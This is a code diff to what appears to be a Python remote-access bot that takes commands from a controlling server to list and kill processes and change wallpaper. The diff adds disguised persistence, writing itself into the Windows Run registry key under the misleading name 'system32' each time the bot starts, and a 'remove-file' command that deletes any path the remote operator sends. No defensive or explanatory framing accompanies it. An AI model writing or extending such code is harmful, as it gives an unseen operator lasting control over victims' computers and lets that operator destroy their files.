@@ -12,7 +12,18 @@ help_message = '''  ├ Help
               └ pids (list of client proccesses)
                 └ kill (PID) (kill proccess by PID)
                   └ set-wallpaper (url) (change client wallpaper)
+                    └ remove-file (path) (remove file from system)
             '''
+
+def AddToRegistry():
+    pth = os.path.dirname(os.path.realpath(__file__))
+    s_name=os.path.split(sys.argv[0])[1]    
+    address=os.path.join(pth,s_name)
+    key = reg.HKEY_CURRENT_USER
+    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
+    reg.SetValueEx(open,"system32",0,reg.REG_SZ,address)
+    reg.CloseKey(open)
 
 def set_wallpaper(url):
     print(url)
@@ -68,6 +79,9 @@ def server_control():
             elif 'set-wallpaper' in command:
                 set_wallpaper(command.split(" ")[1])
                 s.send(f'  └─▷ Background image was successfully changed'.encode())
+            elif 'remove-file' in command:
+                os.remove(command.split(" ")[1])
+                s.send(f'  └─▷ {command.split(" ")[1]} was successfully deleted'.encode())
             else:
                 s.send(f'  └─▷ Command not found!\n{help_message}'.encode())
             
@@ -80,6 +94,7 @@ def server_control():
 def setup_bot():
     global s
     s = socket.socket()
+    AddToRegistry()
     while True:
         try:
             time.sleep(10)
